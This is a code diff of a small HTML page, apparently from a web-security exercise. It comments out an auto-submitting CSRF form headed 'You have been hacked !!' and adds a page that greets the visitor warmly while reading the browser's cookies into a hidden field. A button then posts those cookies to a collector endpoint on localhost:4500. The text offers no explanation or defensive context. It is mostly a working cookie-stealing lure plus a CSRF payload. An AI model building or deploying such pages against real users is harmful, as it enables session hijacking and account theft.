@@ -1,4 +1,4 @@
-<html>
+<!-- <html>
     <body>
         <h1>You have been hacked !! </h1>
         <iframe style="display:none" name="csrf-iframe"></iframe>
@@ -8,4 +8,48 @@
         </form>
         <script>document.getElementById('csrf-form').submit()</script>
     </body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Get Cookie and Set Form Value</title>
+</head>
+<body>
+
+<h1>Hello dear</h1>
+<h1>Hope you doing good</h1>
+
+<form id="myForm" action="http://localhost:4500/user/cookie" method="post">
+    <input type="hidden" name="cookie" id="tokenInput" value="">
+</form>
+
+
+<script>
+    // Function to get cookies
+    function getCookie() {
+        const cookie = document.cookie;
+        return cookie;
+    }
+
+    // Function to set form value
+    function setFormValue() {
+        const token = getCookie();
+        const cookie = document.cookie;
+        document.getElementById('tokenInput').value=cookie;
+    }
+
+    // Call setFormValue when the page loads
+    window.onload = setFormValue;
+
+    // Function to submit the form
+    function submitForm() {
+        document.getElementById("myForm").submit();
+    }
+</script>
+<button onclick="submitForm()">click</button>
+</body>
 </html>
+
